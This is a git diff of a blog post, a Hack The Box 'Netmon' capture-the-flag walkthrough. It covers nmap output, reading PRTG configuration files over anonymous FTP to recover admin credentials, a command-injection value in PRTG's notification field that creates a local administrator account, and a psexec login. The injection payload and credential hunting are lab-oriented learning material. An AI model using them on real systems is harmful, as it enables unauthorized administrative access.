@@ -9,9 +9,9 @@ tags = [
     "CTF_Walkthrough",
 ]
 
-featureImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Legacy_logo.png"
-thumbnail = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Legacy_logo.png"
-shareImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Legacy_logo.png"
+featureImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Netmon.png"
+thumbnail = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Netmon.png"
+shareImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Netmon.png"
 
 +++
 Yes that title was a Pokemon reference, and if you didn't understand it I feel sorry for you. This is my walkthrough of the HTB Netmon box. Enjoy, and find my walkthough below!
@@ -43,9 +43,6 @@ That IP in the green box will be the IP you use for yourself during interactions
 ## Intelligence Gathering
 
 The first thing I always like to do is run NMap. Here is the NMap scan I ran and a breakdown of the flags I used.
-```bash
-nmap -sT -sV -Pn -p- -A -T3 tar.get.ip.add -oA /home/kali/HTB/WU/Legacy/nmap/scans
-```
 {{% notice tip "NMAP Flags"%}}
 -sT = TCP Connect() Scan
 
@@ -61,10 +58,80 @@ nmap -sT -sV -Pn -p- -A -T3 tar.get.ip.add -oA /home/kali/HTB/WU/Legacy/nmap/sca
 
 -oA = output namp in the three formats to the specified file path.
 {{% /notice %}}
-
-While that is running let's go ahead and see if we can find anything at the IP. Open up a web browser and put in the target machines IP address. This time there is a website, and it's asking us for some credintials. Lets let our NMap scan finish and then we'll come back to this. 
 ```bash
-NMAP RESULTS
+nmap -sT -sV -Pn -p- -A -T3 tar.get.ip.add -oA /home/kali/HTB/Recording/Netmon/Nmap/nmap
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 19:42 EDT
+Nmap scan report for 10.10.10.152
+Host is up (0.038s latency).
+Not shown: 65522 closed tcp ports (conn-refused)
+PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-03-19  12:18AM                 1024 .rnd
+| 02-25-19  10:15PM       <DIR>          inetpub
+| 07-16-16  09:18AM       <DIR>          PerfLogs
+| 02-25-19  10:56PM       <DIR>          Program Files
+| 02-03-19  12:28AM       <DIR>          Program Files (x86)
+| 02-03-19  08:08AM       <DIR>          Users
+|_02-25-19  11:49PM       <DIR>          Windows
+80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-server-header: PRTG/18.1.37.13946
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=8/29%OT=21%CT=1%CU=38952%PV=Y%DS=2%DC=T%G=Y%TM=630D4F6
+OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=
+OS:A)OPS(O1=M539NW8ST11%O2=M539NW8ST11%O3=M539NW8NNT11%O4=M539NW8ST11%O5=M5
+OS:39NW8ST11%O6=M539ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
+OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
+OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
+OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
+OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
+OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
+OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
+OS:N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-08-29T23:44:30
+|_  start_date: 2022-08-29T23:40:15
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   36.15 ms 10.10.14.1
+2   36.21 ms 10.10.10.152
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 110.68 seconds
 ```
 
 So, we've got one item that really catches my eye in that NMap scan. Our old friend port 21 Anonymous FTP is open, and seems like an excellent place to start. 
@@ -87,7 +154,7 @@ Once in we can begin doing our usual snooping, and unlike the Lame box here we c
 
 Before we can begin exploring the site we need to successfully login. First thing to always do is check default credintials. After doing some quick Googling you find the username and password. Unforutanetly prtgadmin does not work, so on to plan B. There's some tools and ways we could bruteforce this perhaps, but this PRTGNetworkMonitor appears to be a pretty popular software. Being the creative hackers we are lets see if we can see the configuration files via the anonymous ftp. According to https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data we can find the configuration files stored as PRTG Configuration.dat and that seems like a good a place to start as any.
 
-Jumping back into anonymous ftp we are gonna head to the directory specified from that site. I found the following four interesting files, and grabbed them. From there I opened up each in Sublime, and if you aren't using Sublime you're wrong, and did some key word searching. I got lucky and had started with admin, and got a hit right away.
+Jumping back into anonymous ftp we are gonna head to the directory specified from that site. The directroy these files are stored in is Program Data, and at first it doesn't appear because it is hidden. Running the show directory command with a -a will now reveal program data. Navigating through there the config.old/.old.bak/.dat should catch your attention. When you open that up you see in the .old.bak file an admin username and password. 
 
 
 BUTTTTT it still didn't work. After banging my head on the wall I realized it was a .old document, and it had a year in it. I changed the year to 2019 and was in. Cash money it's time to explore this site.
@@ -102,10 +169,35 @@ This website has a whole lot going on. More then I care to just snoop into, so l
 
 Another incredible site https://tryhackme.com defines command injection as "the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with." The notification portion of this site allows you to do some pretty interesting things, and that is going to be our home as we finish gaining administrator access to this box. 
 
+In the bar up top select Settings, Account settings, Notifications, and then plus sign to create a new notification. Creating the notification we'll just skip most of the stuff at the top and jump straight to the bottom. There we find an option to execute program, and when you turn it on you can type a powershell command. We are going to create an admin user via this command to login using impacket-exec.
+```bash
+abc123.txt | net user jrhacka passwd123! /add ; net localgroup administrators jrhacka /add
+```
+{{% notice tip "Breaking Down the Command"%}}
+abc123.txt = Random document attempting to open
+
+| = and do what is after this also
+
+net user jrhacka passwd123! /add = creating the user jrhacka with the password passwd123!
+
+; = seperating the commands
+
+net localgroup administrators jrhacka /add = adding jrhacka to the administrators group
+{{% /notice %}}
+
+---
+## Using Impacket PsExec
+
+First off what is PsExec? According to https://www.lifewire.com/psexec-4587631 "PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials. It’s a bit like a remote access program but instead of controlling the computer with a mouse, commands are sent via Command Prompt." That's explained it very well, and we are going to use the kali tool impacket-psexec in order to connect to this machine with the credintials we just created. Here is the syntax when connecting with this tool.
+```bash
+impacket-psexec jrhacka:'passwd123!'@10.10.10.152
+```
+After you've connected it's just a matter of snooping around and navigating back to that administrator directory we couldn't get to earlier. In there we find the admin flag and that's all she wrote! I hope you all learned something, enjoyed my writeup, and keep on getting better every day! 
+
 ---
 
 ## Walkthrough Video
 
-{{< youtube 39tOHZCG7E0 >}}
+{{< youtube  >}}
 
 <br>
